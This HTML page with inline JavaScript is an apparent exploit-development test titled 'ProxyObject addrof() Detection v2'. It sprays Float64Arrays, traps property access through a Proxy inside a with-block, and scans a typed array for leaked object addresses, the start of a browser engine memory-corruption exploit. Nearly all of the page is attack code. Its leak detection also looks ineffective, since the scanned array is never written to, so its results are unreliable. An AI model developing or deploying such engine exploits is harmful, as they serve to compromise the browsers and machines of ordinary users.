<!DOCTYPE html>
<html>
<head>
    <title>ProxyObject addrof() Detection v2</title>
    <script>
        function log(msg) {
            document.body.innerHTML += msg + "<br>";
        }

        window.onload = () => {
            log("Starting ProxyObject pointer leak test...");

            // Object we want to find the address of
            const victim = { secret: "flag{exploit_dev_in_progress}" };

            // Spray Float64Arrays to increase chance of overlap
            const sprayCount = 1000;
            let spray = [];
            for (let i = 0; i < sprayCount; i++) {
                spray.push(new Float64Array(4));
            }

            // Add one special array we'll inspect manually
            const probe = new Float64Array(10);
            spray.push(probe);

            let callCount = 0;

            const handler = {
                get(target, prop, receiver) {
                    if (callCount++ > 5) {
                        log("Breaking recursion after 5 calls");
                        return undefined;
                    }

                    log("Proxy 'get' called (" + callCount + ")");
                    log("prop = " + prop);

                    // Try to inspect receiver deeply
                    try {
                        for (let key in receiver) {
                            try {
                                const val = receiver[key];
                                log(`receiver.${key} = ${typeof val} (${val})`);
                            } catch (e) {
                                log(`Error reading receiver.${key}: ${e.message}`);
                            }
                        }
                    } catch (e) {
                        log("Error enumerating receiver keys: " + e.message);
                    }

                    return Reflect.get(...arguments);
                }
            };

            const proxy = new Proxy(victim, handler);

            // Run inside with-block to trigger JSScope behavior
            (function () {
                with (proxy) {
                    try {
                        // Access any property to trigger Proxy trap
                        log("Accessing 'toString'...");
                        toString(); // Could be any property access
                    } catch (e) {
                        log("Exception in with-block: " + e.message);
                    }
                }
            })();

            // After exploit, scan probe array for leaked pointers
            log("Scanning probe buffer for leaked values:");
            for (let i = 0; i < probe.length; i++) {
                let val = probe[i];
                if (val !== 0 && !isNaN(val)) {
                    log(`probe[${i}] = ${val} (0x${val.toString(16)})`);
                }
            }
        };
    </script>
</head>
<body>
    <h2>ProxyObject Pointer Leak Test v2</h2>
    <p>Detecting potential leaked pointers using TypedArray heap spraying.</p>
</body>
</html>
